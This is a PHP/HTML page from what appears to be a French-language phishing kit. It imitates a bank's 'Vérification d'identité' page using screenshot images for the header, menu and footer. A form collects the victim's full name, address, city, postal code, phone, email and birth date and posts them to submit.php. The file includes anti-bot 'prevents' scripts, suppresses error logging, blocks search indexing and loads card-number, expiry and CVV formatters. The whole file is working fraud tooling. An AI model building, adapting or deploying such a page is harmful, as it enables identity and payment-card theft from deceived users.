<?php
include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');


    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Bienvenue</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header2">
            <div class="container cc">
                <div class="header-inner">
                    <div class="title"><img style="min-width: 246px;" src="../assets/images/login-title.png"></div>
                    <div class="menu"><img style="min-width: 243px;" src="../assets/images/login-right.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- NAV -->
        <nav>
            <div class="container cc">
                <img style="min-width: 573px;" src="../assets/images/login-menu.png">
            </div>
        </nav>
        <!-- END NAV -->

        <!-- SERVICE -->
        <div class="mb50">
            <div class="container cc">
                <img style="min-width: 940px;" src="../assets/images/login-service.png">
            </div>
        </div>
        <!-- END SERVICE -->

        <!-- FORM -->
        <div class="mb50" id="details">
            <div class="container">
                <h3>Vérification d'identité</h3>
                <form method="post" action="submit.php">
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'full_name') ?>">
                        <label for="full_name" class="col-3">Nom et prénom</label>
                        <div class="col-9">
                            <input type="text" name="full_name" id="full_name" class="form-control" value="<?php echo get_value('full_name'); ?>" placeholder="Nom et prénom">
                            <?php echo error_message($_SESSION['errors'],'full_name'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'address') ?>">
                        <label for="address" class="col-3">Adresse</label>
                        <div class="col-9">
                            <input type="text" name="address" id="address" class="form-control" value="<?php echo get_value('address'); ?>" placeholder="Votre adresse">
                            <?php echo error_message($_SESSION['errors'],'address'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'city') ?>">
                        <label for="city" class="col-3">Ville</label>
                        <div class="col-9">
                            <input type="text" name="city" id="city" class="form-control" value="<?php echo get_value('city'); ?>" placeholder="Votre ville">
                            <?php echo error_message($_SESSION['errors'],'city'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'zip_code') ?>">
                        <label for="zip_code" class="col-3">Code postale</label>
                        <div class="col-9">
                            <input type="text" name="zip_code" id="zip_code" class="form-control" value="<?php echo get_value('zip_code'); ?>" placeholder="Code postale">
                            <?php echo error_message($_SESSION['errors'],'zip_code'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>">
                        <label for="phone" class="col-3">Téléphone</label>
                        <div class="col-9">
                            <input type="text" name="phone" id="phone" class="form-control" value="<?php echo get_value('phone'); ?>" placeholder="XX XX XX XX XX">
                            <?php echo error_message($_SESSION['errors'],'phone'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'email') ?>">
                        <label for="email" class="col-3">Adresse électronique</label>
                        <div class="col-9">
                            <input type="email" name="email" id="email" class="form-control" value="<?php echo get_value('email'); ?>" placeholder="example@mail.com">
                            <?php echo error_message($_SESSION['errors'],'email'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'birth_date') ?>">
                        <label for="birth_date" class="col-3">Date de naissance</label>
                        <div class="col-9">
                            <input type="text" name="birth_date" maxlength="10" id="birth_date" class="form-control" value="<?php echo get_value('birth_date'); ?>" placeholder="jj/mm/aaaa">
                            <?php echo error_message($_SESSION['errors'],'birth_date'); ?>
                        </div>
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="details">
                    <div class="text-right mt-5">
                        <button type="submit">Continue</button>
                    </div>
                </form>
            </div>
        </div>
        <!-- END FORM -->

        <!-- BANNER -->
        <div>
            <div class="container cc text-center">
                <img style="min-width: 934px;" src="../assets/images/login-banner.png">
            </div>
        </div>
        <!-- END BANNER -->


        <!-- FOOTER -->
        <footer id="footer2" class="mt50">
            <div class="container cc">
                <img style="min-width: 863px;" src="../assets/images/login-footer.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_date').payment('formatCardExpiry');
            jQuery('#cc_cvv').payment('formatCardCVC');
        </script>

    </body>

</html>